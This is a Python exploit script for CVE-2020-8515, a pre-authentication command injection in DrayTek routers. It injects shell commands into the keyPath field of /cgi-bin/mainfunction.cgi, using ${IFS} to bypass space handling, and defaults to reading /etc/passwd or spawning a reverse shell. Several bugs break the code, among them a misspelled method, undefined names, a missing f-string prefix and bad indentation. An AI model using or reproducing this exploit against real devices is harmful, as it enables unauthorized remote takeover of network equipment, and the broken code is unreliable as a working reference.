#!/usr/bin/python3
import sys
import payloads
import requests


"""
Service: DrayTek Devices
Version: 2960, 3900 and 300B
Vulnerability Type: Pre-Auth RCE via Command Injection
Vulnerable Component: /cgi-bin/mainfunction.cgi
CVE: https://nvd.nist.gov/vuln/detail/CVE-2020-8515
"""



def check_8515(target):
    payload = "/bin/sh -c 'echo 20208515'".replace(" ", "${IFS}")
    rsp_data = {"action": "login", "keyPath": payload, "loginUser": "exp", "loginPwd": "exp"}
    try:
        check_rsp = requests.post(f"{target}/cgi-bin/mainfunction.cgi",
                              data = rsp_data)
        return True if "20208515" in check_rsp.text else False
    except Exception as e:
        print(f"\033[1;31m[-]\033[1;m {e}")
        exit()
def main(target):
    # Format Validation
    if target.endwith("/"):
        target = target[:-1]
    if check_8515(target):
        print(f"\033[1;32m[+]\033[1;m {target_url} is vulnerable to CVE-2020-8515!")
        # Payload:
        command = input("Enter the command to execute (or rshell for a reverse shell): ")
        if command.lower() == rhell:
            command = payloads.rshell()
        elif command == "":
            command = "cat /etc/passwd"
        payload = "/bin/sh -c '{command}'".replace(" ", "${IFS}")
        # Exploit:
        rsp_data = {"action": "login", "keyPath": payload, "loginUser": "exp", "loginPwd": "exp"}
        exploit_rsp = requests.post(f"{target}/cgi-bin/mainfunction.cgi",
                                    data = rsp_data)
        print(exploit_rsp.text)
   else:
        print(f"\033[1;31m[-]\033[1;m {target} not vulnerable to CVE-2020-8515!")
if __name__ == "__main__":
    try:
        main(sys.argv[1])
    except IndexError:
        print(f"Usage: {sys.argv[0]} <target>")
